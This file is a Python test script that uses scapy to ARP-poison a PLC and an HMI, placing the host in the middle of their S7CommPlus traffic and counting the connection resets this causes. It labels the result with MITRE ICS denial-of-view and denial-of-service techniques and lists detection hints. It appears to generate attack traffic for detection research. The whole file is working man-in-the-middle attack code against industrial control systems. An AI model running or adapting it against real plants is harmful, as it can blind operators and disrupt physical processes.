#!/usr/bin/env python3
"""
tests/test_mitm_disrupt.py
ARP Poison + S7CommPlus Disruption
S7CommPlus co TLS/integrity -> khong sua duoc payload.
Nhưng MITM van gay: ARP anomaly, TCP retrans, disconnect storm.
MITRE: T0830 (AiTM), T0815 (Denial of View), T0814 (Denial of Service)

Chay (can Admin): python tests/test_mitm_disrupt.py
"""

import sys
import os
import time
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

DURATION = 60
DISRUPT_INTERVAL = 10  # moi 10s drop 1 lan

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, sendp, sniff, get_if_hwaddr, srp, conf
    )
    conf.verb = 0
except ImportError:
    print("[!] Thieu scapy: pip install scapy")
    sys.exit(1)


poison_running = True
disconnect_count = 0
arp_count = 0


def get_mac(ip, iface):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=2, iface=iface, verbose=0)
        return ans[0][1].hwsrc if ans else None
    except Exception:
        return None


def arp_poison_thread(hmi_ip, plc_ip, hmi_mac, plc_mac, iface):
    global arp_count
    my_mac = get_if_hwaddr(iface)

    poison_hmi = Ether(dst=hmi_mac) / ARP(
        op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=my_mac
    )
    poison_plc = Ether(dst=plc_mac) / ARP(
        op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=my_mac
    )

    while poison_running:
        sendp(poison_hmi, iface=iface, verbose=False)
        sendp(poison_plc, iface=iface, verbose=False)
        arp_count += 1
        time.sleep(1)


def restore_arp(hmi_ip, plc_ip, hmi_mac, plc_mac, iface):
    fix_hmi = Ether(dst=hmi_mac) / ARP(
        op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=plc_mac
    )
    fix_plc = Ether(dst=plc_mac) / ARP(
        op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=hmi_mac
    )
    for _ in range(5):
        sendp(fix_hmi, iface=iface, verbose=False)
        sendp(fix_plc, iface=iface, verbose=False)
        time.sleep(0.3)
    print("[ARP] Restored")


def main():
    global poison_running, disconnect_count, arp_count
    poison_running = True
    disconnect_count = 0
    arp_count = 0

    plc_ip = PLC_IP
    hmi_ip = HMI_IP
    iface = IFACE

    print(f"\n{B}[TEST] MITM_DISRUPT (ARP Poison + S7 Disruption){X}")
    info(f"PLC: {plc_ip}  HMI: {hmi_ip}  Iface: {iface}")
    info(f"Duration: {DURATION}s  Disrupt interval: {DISRUPT_INTERVAL}s")
    info("S7CommPlus TLS -> khong sua payload -> gay disruption thay vao do")

    changes = []
    observable = []
    notes = []
    error = None
    t0 = time.time()

    try:
        # Get MACs
        plc_mac = get_mac(plc_ip, iface)
        hmi_mac = get_mac(hmi_ip, iface)

        if not plc_mac:
            fail(f"PLC {plc_ip} not reachable")
            error = f"PLC unreachable"
            print_result("MITM_DISRUPT", False, [], [], [], time.time()-t0, error)
            return

        if not hmi_mac:
            fail(f"HMI {hmi_ip} not reachable")
            error = f"HMI unreachable"
            print_result("MITM_DISRUPT", False, [], [], [], time.time()-t0, error)
            return

        ok(f"PLC MAC: {plc_mac}  HMI MAC: {hmi_mac}")

        # IP forward (Linux)
        if sys.platform.startswith("linux"):
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            info("IP forwarding ON")

        # Start ARP poison
        poison_thread = threading.Thread(
            target=arp_poison_thread,
            args=(hmi_ip, plc_ip, hmi_mac, plc_mac, iface),
            daemon=True
        )
        poison_thread.start()
        ok("ARP poison started")

        # Monitor/observe for DURATION
        info("Observing S7 disruption for {DURATION}s...")

        def monitor_callback(pkt):
            global disconnect_count
            if pkt.haslayer(TCP):
                flags = pkt[TCP].flags
                if flags & 0x04:  # RST flag
                    disconnect_count += 1
                    if disconnect_count % 10 == 0:
                        info(f"  RST observed: {disconnect_count} connections reset")

        sniffer = threading.Thread(
            target=lambda: sniff(
                iface=iface,
                filter=f"tcp port 102 and (host {plc_ip} or host {hmi_ip})",
                prn=monitor_callback,
                timeout=DURATION,
                store=False
            ),
            daemon=True
        )
        sniffer.start()

        for sec in range(DURATION):
            time.sleep(1)
            if (sec + 1) % 10 == 0:
                info(f"  [{sec+1:3d}s] ARP poison: {arp_count} RST: {disconnect_count}")

        sniffer.join(timeout=5)

        observable.append(f"ARP poison: {arp_count} poison packets sent")
        observable.append(f"S7 disruption: {disconnect_count} RST connections")
        observable.append("ARP duplicate: HMI MAC remapped to attacker MAC")
        observable.append("S7CommPlus TLS prevents payload modification — disruption thay vao do")
        notes.append(f"ARP poison rounds: {arp_count} | RST observed: {disconnect_count}")
        notes.append("MITRE: T0830 (AiTM) -> T0815 (Denial of View) -> T0814 (Denial of Service)")
        notes.append("Wireshark: arp.duplicate-address-frame && tcp.analysis.retransmission")
        notes.append("CIC: high TCP retrans rate, ARP anomaly, session reconnect storm")

    except PermissionError:
        error = "Need Admin/root for raw L2 frames"
        fail(error)
    except Exception as e:
        error = str(e)
        fail(str(e))
    finally:
        poison_running = False
        time.sleep(1)
        try:
            restore_arp(hmi_ip, plc_ip, hmi_mac, plc_mac, iface)
        except Exception:
            pass
        if sys.platform.startswith("linux"):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    success = arp_count > 0
    print_result("MITM_DISRUPT", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
